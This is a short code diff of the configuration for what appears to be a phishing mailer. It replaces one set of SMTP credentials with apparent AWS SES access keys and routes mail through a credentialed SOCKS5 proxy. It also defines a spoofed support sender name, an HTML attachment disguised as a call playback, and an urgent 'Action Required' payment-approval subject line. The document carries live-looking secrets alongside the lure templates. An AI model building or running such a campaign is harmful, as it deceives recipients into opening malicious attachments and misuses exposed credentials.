@@ -102,12 +102,12 @@ const options = {
   useAuthentication: true,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'smtp.mailersend.net',
+  smtpHost: 'email-smtp.us-east-1.amazonaws.com',
   smtpPort: 587,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
-  smtpUsername: 'MS_eztaiQ@itrebians.org',
-  smtpPassword: 'dPlniylmRWXT9yAm',
+  smtpUsername: 'AKIAZ3YXYNS3H4M3MFXM',
+  smtpPassword: 'BL/4Xc9LK7G4H5TLGxobiOg4UmBBxmuetBLMA0VdngY9',
   proxyHost: '63.160.189.222',
   proxyPort: 35149,
   proxyUsername: 'user',
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['MS_eztaiQ@itrebians.org'];
+const senderAddresses = ['akash@telepresenz.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "Service client (SupportClient{RECIPIENT_DOMAIN_NAME})"; 
 const subjectLineWithPlaceholders = "Q4 Drawdown Approval [FuseSign - Action Required] | RE: [{RANDOM_MD5}]";
